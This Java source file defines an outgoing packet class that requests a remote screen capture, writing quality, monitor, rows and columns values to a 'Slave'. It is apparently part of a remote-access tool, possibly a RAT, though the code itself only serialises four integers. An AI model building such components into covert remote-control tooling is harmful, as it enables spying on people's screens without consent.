package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet12RemoteScreen extends AbstractOutgoingPacket {
	
	private int quality;
	private int monitor;
	private int rows;
	private int cols;

	public Packet12RemoteScreen(int quality, int monitor, int rows, int cols) {
		this.quality = quality;
		this.monitor = monitor;
		this.rows = rows;
		this.cols = cols;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(quality);
		dos.writeInt(monitor);
		dos.writeInt(rows);
		dos.writeInt(cols);
	}

	@Override
	public byte getPacketId() {
		return 12;
	}

}
